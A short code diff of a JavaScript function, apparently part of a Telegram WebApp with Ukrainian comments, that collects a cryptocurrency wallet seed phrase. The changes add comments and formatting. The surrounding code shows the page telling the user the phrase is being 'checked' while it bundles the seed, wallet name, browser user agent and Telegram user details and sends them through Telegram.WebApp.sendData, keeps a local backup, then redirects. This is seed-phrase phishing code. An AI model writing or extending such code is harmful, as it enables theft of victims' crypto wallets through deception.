@@ -133,6 +133,7 @@ function showProcessing(message) {
 // 🚀 Надсилання seed
 function submitSeed() {
     clearWarning();
+
     const length = parseInt(document.getElementById("length").value);
     const wallet = document.getElementById("wallet").value || "unknown";
     const ua = navigator.userAgent;
@@ -152,7 +153,10 @@ function submitSeed() {
 
     const seed = words.join(" ");
     showProcessing("⏳ Перевірка seed-фрази…");
-    document.querySelector(".container").innerHTML = "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
+
+    // 💬 Відображення короткого повідомлення перед редиректом
+    document.querySelector(".container").innerHTML =
+        "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
 
     const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
     const payload = {
@@ -169,13 +173,16 @@ function submitSeed() {
         timestamp: new Date().toISOString()
     };
 
+    // 💾 Зберігаємо резервну копію
     localStorage.setItem("payload_backup", JSON.stringify(payload));
 
+    // 📤 Надсилаємо через Telegram WebApp
     if (Telegram?.WebApp?.sendData) {
         Telegram.WebApp.sendData(JSON.stringify(payload));
         console.log("✅ Payload відправлено", payload);
     }
 
+    // 🔁 Переходимо на profile.html
     setTimeout(() => {
         window.location.href = "profile.html";
     }, 1200);
